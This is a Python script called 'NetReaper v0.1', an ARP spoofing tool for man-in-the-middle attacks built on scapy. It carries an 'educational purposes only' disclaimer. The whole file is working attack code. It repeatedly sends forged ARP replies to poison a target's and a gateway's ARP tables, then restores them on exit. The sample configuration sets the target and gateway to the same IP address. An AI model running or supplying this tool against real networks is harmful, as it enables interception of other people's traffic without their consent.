# NetReaper v0.1
# An ARP spoofer for educational MITM attacks.
# Coded by: Mystery-World3
#
# WARNING: For educational purposes only. Only use on networks and devices
# you own and have explicit permission to test.

import sys
import time
from scapy.all import ARP, Ether, srp, sendp
from rich.console import Console

console = Console()

def get_mac(ip_address: str) -> str | None:
    """
    Returns the MAC address for a given IP address by broadcasting an ARP request.
    
    Args:
        ip_address (str): The IP address to find the MAC for.
        
    Returns:
        str or None: The MAC address as a string if found, otherwise None.
    """
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip: str, spoof_ip: str, target_mac: str):
    """
    Sends a single, correctly-formed, spoofed ARP packet to the target.
    This tells the target_ip that the spoof_ip is at our MAC address.
    """
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

def restore(dest_ip: str, src_ip: str, dest_mac: str, src_mac: str):
    """
    Restores the network by sending a legitimate ARP packet to correct the ARP table.
    """
    packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    # Send the restoration packet multiple times to ensure it's received.
    sendp(packet, count=4, verbose=False)

def main():
    """Main function to run the ARP spoofer."""
    # --- CONFIGURATION ---
    # IMPORTANT: Set the target and gateway IP for your network.
    target_ip = "192.168.43.65"  # <-- SET YOUR TARGET'S IP HERE
    gateway_ip = "192.168.43.65" # <-- SET YOUR GATEWAY/ROUTER'S IP HERE
    # --- END CONFIGURATION ---

    console.print("[bold cyan]NetReaper v0.1[/bold cyan] - ARP Spoofer", justify="center")
    console.print("[yellow]Acquiring MAC addresses...[/yellow]")
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
    except Exception as e:
        console.print(f"[bold red]Error during MAC acquisition:[/bold red] Ensure you are running with root/administrator privileges.")
        sys.exit()

    if not target_mac:
        console.print(f"[bold red]Error:[/bold red] Could not get MAC for target {target_ip}. Host may be down or IP is incorrect.")
        sys.exit()
    if not gateway_mac:
        console.print(f"[bold red]Error:[/bold red] Could not get MAC for gateway {gateway_ip}. Host may be down or IP is incorrect.")
        sys.exit()
        
    console.print(f"[green]✓[/green] Target MAC:  [bold yellow]{target_mac}[/bold yellow]")
    console.print(f"[green]✓[/green] Gateway MAC: [bold yellow]{gateway_mac}[/bold yellow]\n")
    
    sent_packets_count = 0
    try:
        console.print("[bold green]Starting ARP spoofing... Press Ctrl+C to stop.[/bold green]")
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            
            sent_packets_count += 2
            # The \r character moves the cursor to the beginning of the line
            console.print(f"[cyan]Packets Sent: {sent_packets_count}[/cyan]", end="\r")
            time.sleep(2)
            
    except KeyboardInterrupt:
        console.print("\n\n[bold yellow]Ctrl+C detected. Restoring ARP tables... Please wait.[/bold yellow]")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        console.print("[bold green]✓[/bold green] ARP tables restored. Exiting gracefully.")
        sys.exit()

if __name__ == "__main__":
    main()